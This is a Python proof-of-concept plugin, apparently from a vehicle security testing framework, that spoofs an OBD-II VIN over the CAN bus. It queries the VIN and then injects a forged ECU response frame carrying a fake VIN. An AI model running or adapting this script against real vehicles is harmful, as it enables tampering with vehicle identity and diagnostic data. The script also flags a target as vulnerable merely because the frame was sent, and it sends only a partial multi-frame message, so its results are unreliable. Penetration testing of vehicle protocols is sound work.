"""
PoC Name: OBD-II VIN Spoofing
Identifier: CWE-345
Component: OBD-II Protocol
Category: Protocol
Severity: Medium
CVSS: 5.0
Description: 通过CAN总线发送伪造VIN响应,验证OBD-II是否缺少VIN完整性保护。
Prerequisites: PCAN接口, python-can库, PCAN驱动。
Usage: python3 09_OBD_VIN_Spoof.py PCAN_USBBUS1
"""
import sys
from iv_plugin_base import IVIVulnerabilityPlugin
from can_bus_utils import format_can_settings, get_can_settings, open_can_bus
class OBDVINSpoofPlugin(IVIVulnerabilityPlugin):
    meta_display_id = "POC-CAN-009"
    meta_poc_name = "OBD VIN Spoof"
    meta_cve_id = "CWE-345"
    meta_severity = "Medium"
    meta_protocol = "can"
    meta_target_os = ["all"]
    meta_required_params = ["can_interface"]
    is_disruptive = False
    meta_destructive_level = "Safe"

    def check_prerequisites(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"检查CAN接口: {format_can_settings(settings)}")
        return True
    def exploit(self):
        settings = get_can_settings(self.params)
        self.logger.info(f"OBD-II VIN欺骗测试 ({format_can_settings(settings)})...")
        try:
            import can
            bus = open_can_bus(self.params)
            # First query VIN (Mode 09 PID 02)
            query = can.Message(arbitration_id=0x7DF,
                data=[0x02, 0x09, 0x02, 0,0,0,0,0], is_extended_id=False)
            bus.send(query)
            resp = bus.recv(timeout=2.0)
            if resp:
                self.logger.info(f"原始VIN响应: {resp.data.hex()}")
            # Inject fake VIN response
            fake_vin = b"FAKEVIN12345678"
            fake_resp = can.Message(arbitration_id=0x7E8,
                data=[0x10, 0x14, 0x49, 0x02, 0x01] + list(fake_vin[:3]),
                is_extended_id=False)
            bus.send(fake_resp)
            self.logger.warning("[+] 伪造VIN响应已注入")
            self.results["vulnerable"] = True
            self.results["evidence"] = "Fake VIN response injected"
            bus.shutdown()
        except ImportError:
            self.logger.error("python-can未安装")
            self.results["vulnerable"] = False
        except Exception as e:
            self.logger.error(f"VIN欺骗测试失败: {e}")
            self.results["vulnerable"] = False
        return self.results

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 09_OBD_VIN_Spoof.py <can_interface>")
        sys.exit(1)
    plugin = OBDVINSpoofPlugin({"target_ip": "N/A", "can_interface": sys.argv[1]})
    plugin.run_verify()
